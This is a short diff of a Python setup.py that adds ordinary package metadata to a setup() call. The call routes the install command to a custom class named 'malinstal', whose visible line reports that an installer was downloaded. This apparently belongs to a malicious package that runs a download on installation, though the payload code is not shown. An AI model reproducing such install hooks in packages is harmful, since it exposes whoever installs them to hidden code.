@@ -36,6 +36,12 @@ class malinstal(install):
             print('Installer downloaded to current directory')
 
 setup(
+    name=NAME,
+    description=DESCRIPTION,
+    author=AUTHOR,
+    author_email=EMAIL,
+    python_requires=REQUIRES_PYTHON,
+    url=URL,
     cmdclass={"install": malinstal},
     use_wheel=False
 )
